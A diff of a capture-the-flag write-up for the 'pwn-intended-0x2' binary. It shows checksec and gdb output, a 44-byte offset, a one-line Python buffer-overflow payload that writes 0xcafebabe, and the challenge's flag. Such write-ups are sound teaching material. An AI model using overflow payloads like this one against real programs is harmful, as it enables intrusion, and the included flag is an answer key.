@@ -6,7 +6,7 @@ $ file pwn-intended-0x2
 pwn-intended-0x2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
  /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3fe5fe06984f7093c9122fb1b08fb834a63784d4, 
  for GNU/Linux 3.2.0, not stripped
- 
+
 $checksec pwn-intended-0x2
 [*] pwn-intended-0x2'
     Arch:     amd64-64-little
@@ -101,15 +101,16 @@ EFLAGS: 0xa97 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction OVERFLOW)
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 
-Breakpoint 2, 0x00000000004011f5 in main ()```
+Breakpoint 2, 0x00000000004011f5 in main ()
+```
 
 when i try to fill stack with values. i found it is 44 
 
 so we can craft our exploit.
 
-``` 
+
 python -c 'print "A"*44 + '\xbe\xba\xfe\xca'' 
-```
+
  
 flag  csictf{c4n_y0u_re4lly_telep0rt?}
 
